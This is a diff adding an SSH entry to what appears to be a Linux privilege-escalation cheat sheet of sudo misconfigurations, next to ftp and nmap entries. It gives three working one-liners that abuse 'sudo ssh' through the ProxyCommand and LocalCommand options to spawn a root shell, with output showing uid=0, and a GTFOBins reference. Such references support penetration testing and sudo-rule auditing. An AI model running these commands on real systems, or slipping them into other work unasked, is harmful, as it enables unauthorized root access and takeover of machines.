@@ -443,6 +443,37 @@ sudo /usr/bin/ftp
 !/bin/bash
 ```
 
+### SSH
+
+If you can run ssh with sudo, you can spawn a root shell using the ProxyCommand option:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/ssh
+```
+
+**Method 1 - ProxyCommand:**
+
+```bash
+sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Method 2 - Run command via SSH:**
+
+```bash
+sudo ssh -o ProxyCommand="sh -c 'exec sh -i'" localhost
+```
+
+**Method 3 - Using PermitLocalCommand:**
+
+```bash
+sudo ssh -o PermitLocalCommand=yes -o LocalCommand='/bin/bash' user@127.0.0.1
+```
+
+**Reference:** https://gtfobins.github.io/gtfobins/ssh/
+
 ### nmap
 
 * Method 1
